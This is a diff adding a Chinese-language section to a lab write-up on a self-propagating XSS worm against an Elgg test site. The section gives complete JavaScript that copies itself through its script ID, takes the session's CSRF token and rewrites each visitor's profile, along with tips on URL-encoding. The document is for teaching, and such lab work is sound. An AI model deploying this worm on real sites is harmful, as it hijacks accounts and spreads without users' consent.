@@ -268,4 +268,97 @@ GET的不同在于参数直接附加在GET请求的URL尾部，注意这里frien
 
 可以看到Samy果然又被Alice加上了~~
 
+## Writing a Self-Propagating XSS Worm
+
+该任务要求实现真正的XSS蠕虫，也就是说这段恶意代码可以自我传播，任意用户访问被感染的用户的profile页时也会被传染。从实现上来说，要自我传播就需要在感染用户时把自身也复制到用户的profile中。具体来说有以下两种实现方式：
+
+### ID方法
+
+ID方法其实就是通过给我们嵌入profile的script代码段添加一个ID，使得这个script元素可以被Javascript的getElementByID(“ID name”)提取出来，从而进行复制，比方说下面这一段代码：
+
+![XSS6](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image60.png)
+
+### Src方法
+
+Src方法则是把恶意代码放在外部作为一个单独的文件，然后通过script标签的src属性来进行调用。我们只需要设置受害者的profile信息中也通过script标签引用这个文件就可以了。
+
+![XSS6](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image61.png)
+
+实验文档中说两种方法都可以试试，但ID方法必须完成。因为比较有挑战.. 恰好Src方法我在上一个Task也尝试过了，要实现不难。所以这个Task就用ID方法来完成。
+
+终于故事要来到结尾了，大魔王Samy嫌只祸害Alice一个人还不够，他决定制作一个能自我复制的蠕虫病毒，成为所有人的爸爸！
+
+先简单测试一下ID方法的调用方式，在About me字段中写入代码：
+
+![XSS6](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image62.png)
+
+![XSS6](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image63.png)
+
+Javascript中getElementByID的用法和上一个Task中getElementByClassName类似，不过因为ID是唯一的，所以我们可以提取到唯一的网页对象，然后可以通过innerHTML把网页源码提出出来。
+
+接下来我们需要做的其实上一个Task中基本都实现好了，只是将修改的内容加上攻击代码再进行提交：
+
+```js
+<script id="worm" type="text/javascript">
+
+var strCode = document.getElementById("worm").innerHTML;
+alert(strCode);
+var user = elgg.session.user.username;
+if(user!='samy'){
+    var Ajax=null;
+    // Construct the header information for the HTTP request
+    Ajax=new XMLHttpRequest();
+    if(Ajax==null)
+        alert("Ajax is null");
+    Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
+    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+    Ajax.setRequestHeader("User-Agent","AJAX 1.2");
+    Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");
+    Ajax.setRequestHeader("Accept-Encoding","gzip, deflate");
+    Ajax.setRequestHeader("Cookie",document.cookie);
+    Ajax.setRequestHeader("Connection","keep-alive");
+    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    // Construct the content. The format of the content can be learned
+    // from LiveHTTPHeaders.
+
+    var sub_script_begin='<script id="worm" type="text\/javascript">';
+    var sub_script_end="<\/script>";
+    var sub_script=sub_script_begin.concat(strCode,sub_script_end);
+    sub_script = escape(sub_script);
+
+    var content="__elgg_token=".concat(elgg.security.token.__elgg_token);
+    content = content.concat("&__elgg_ts=").concat(elgg.security.token.__elgg_ts);
+    content = content.concat("&name=").concat(user);
+    content = content.concat("&&description=I'm your father!").concat(sub_script);
+    content = content.concat("&guid=").concat(elgg.session.user.guid);
+
+    // Send the HTTP POST request.
+    Ajax.setRequestHeader("Content-Length",content.length);
+    Ajax.send(content);
+}
+
+</script>
+```
+
+把上面的代码复制到samy的profile中，然后登录alice的账户，查看samy的profile页。查看后再回到alice的profile页：
+
+![XSS6](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image57.png)
+
+果然alice又被毒上了，再点击Edit profile查看此时的profile：
+
+![XSS6](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image64.png)
+
+可以看到攻击代码被一并放入alice的profile中，对比一下我们前面编写的代码，一模一样的话就说明攻击成功了，这样当别的用户点击alice或samy的profile时就会被感染上了。
+
+特别注意因为这个Task我们实际是在script里面又编了一个script，把攻击代码放在里面的script里作为POST的参数传输，但是如果不注意格式上的修改，就非常容易出错，这也是实验的最大难点。
+
+其中最需要注意的是+号，为什么呢？因为在URL中加号是被解析为空格的，所以我们代码中的加号都会被解析成空格。开始我没有太注意这个问题，后来我发现攻击代码虽然成功传递到Alice的profile中缺无法感染别人。于是我使用了diff命令来排查Alice的profile和Samy的profile有什么不同，很快就注意到了Samy的攻击代码中所有的加号都被替换成了空格。这是因为我们传播恶意代码是把它们放入URL中，所以加号就会重新解析称空格，攻击代码就无法正常执行了。
+
+实验文档中提出了解决方案，我们可以使用escape函数对字符串重新编码，使得它符合URL中传递的格式：
+
+![XSS6](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image65.png)
+
+而要解决Javascript代码中字符串连接的问题，我们可以使用concat函数来取替，所以上面的实现代码中content部分的所有连接我都替换为了concat形式。这下再次进行试验，感染后profile中的代码就和原攻击代码一模一样了。
+
+最后说说XSS的防御方法，其实也很简单，就是增加特殊字符或者特殊字符串的检测，比方说有人嵌入了`<script>`这个字符串，那他很可能就不安好心，对于这样的情况直接把它输入的攻击代码清空就好了。当然，如果是程序员可能需要分享一下代码什么的就不同了，这个不同网站有不同处理方式，比方说显示一个markdown文档会用\`\`\`或者缩进块来表示这一段是代码，那么处理方式就根据网站设定有所不同，但都不会执行就是了。
 
